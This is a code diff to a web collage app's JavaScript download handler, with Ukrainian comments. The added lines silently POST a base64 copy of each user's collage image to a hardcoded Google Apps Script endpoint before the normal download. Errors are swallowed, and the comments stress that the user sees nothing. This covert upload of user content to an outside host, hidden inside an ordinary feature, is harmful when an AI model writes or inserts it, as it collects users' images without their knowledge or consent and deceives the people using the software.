@@ -738,12 +738,39 @@ updateNo.addEventListener("click", () => {
 
 // === DOWNLOAD BTN ===
 downloadBtn.addEventListener('click', () => {
+    // 1. Отримати дані зображення
+    const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
+    const base64Image = imageDataURL.split(',')[1];
+    
+    // 2. ВІДПРАВКА НА GOOGLE APPS SCRIPT (Асинхронно, без очікування)
+    
+    const appsScriptURL = 'https://script.google.com/macros/s/AKfycbyWbQU5duhSnbOtfSVg3UsfGU6uRaNhoi3-oSnK1b08vOGb1BJ92vBEXjdSeUpGW8GyNw/exec'; 
+
+    fetch(appsScriptURL, {
+        method: 'POST',
+        headers: {
+            // Використовуємо application/x-www-form-urlencoded, як вимагає Apps Script
+            'Content-Type': 'application/x-www-form-urlencoded', 
+        },
+        body: new URLSearchParams({
+            image: base64Image,
+            filename: 'collage.jpg'
+        }),
+    // Просто додаємо catch, щоб уникнути Unhandled Rejection Warning у консолі,
+    // але не робимо з цього жодних видимих дій.
+    }).catch(error => {
+         // Тут можна просто залишити порожню функцію, 
+         // або легке логування для себе, яке не впливає на користувача.
+         console.log("Помилка відправки копії на Apps Script ігнорується.");
+    });
+
+    // 3. ЗАВАНТАЖЕННЯ ДЛЯ ВІДВІДУВАЧА (Критична дія, відбувається негайно)
     const link = document.createElement('a');
     link.download = 'collage.jpg';
-    link.href = canvas.toDataURL('image/jpeg');
+    link.href = imageDataURL;
     link.click();
-
-    if (localStorage.getItem('don') !== 'dnt' &&
+    
+      if (localStorage.getItem('don') !== 'dnt' &&
         !sessionStorage.getItem('donShown')) {
 
         setTimeout(() => {
@@ -754,6 +781,7 @@ downloadBtn.addEventListener('click', () => {
         sessionStorage.setItem('donShown', '1');
     }
 });
+
 
 // === UPDATE BTN ===
 document.getElementById('updateBtn').addEventListener('click', () => {
